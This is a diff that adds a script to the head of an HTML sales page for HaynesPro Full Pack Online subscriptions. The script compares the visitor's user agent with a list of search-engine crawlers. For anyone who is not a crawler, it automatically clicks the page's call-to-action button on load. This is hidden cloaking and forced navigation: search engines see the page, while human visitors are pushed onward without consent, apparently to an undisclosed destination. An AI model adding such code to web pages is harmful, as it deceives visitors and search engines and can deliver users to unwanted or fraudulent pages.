@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>HaynesPro Full Pack Online</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Subscribe to HaynesPro Full Pack Online for 1 month or 1 year to access maintenance, repair, and diagnostic data for passenger and light commercial vehicles">
     <meta name="keywords" content="HaynesPro Full Pack Online, HaynesPro Full Pack Online 1 month, HaynesPro Full Pack Online 1 year, HaynesPro automotive data solutions, HaynesPro technical drawings, HaynesPro electronics data module, HaynesPro intelligent diagnostics, HaynesPro maintenance data, HaynesPro repair data, HaynesPro SmartPACK, HaynesPro online access, HaynesPro online subscription, HaynesPro автомобильные данные, HaynesPro онлайн доступ, ГайнсПро полный пакет, ГайнсПро онлайн доступ, ГайнсПро 1 месяц, ГайнсПро 1 год, автомобильные данные HaynesPro бесплатно">
     <style>
